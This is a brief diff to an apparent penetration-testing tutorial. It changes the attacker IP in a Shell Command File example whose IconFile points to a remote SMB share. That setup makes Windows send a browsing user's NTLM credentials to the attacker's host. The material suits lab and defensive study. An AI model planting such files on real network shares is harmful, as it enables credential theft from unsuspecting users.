@@ -10,7 +10,7 @@ In this example, let's create the following file and name it something like `@In
 ```powershell
 [Shell]
 Command=2
-IconFile=\\10.10.14.3\share\legit.ico
+IconFile=\\10.10.14.18\share\legit.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
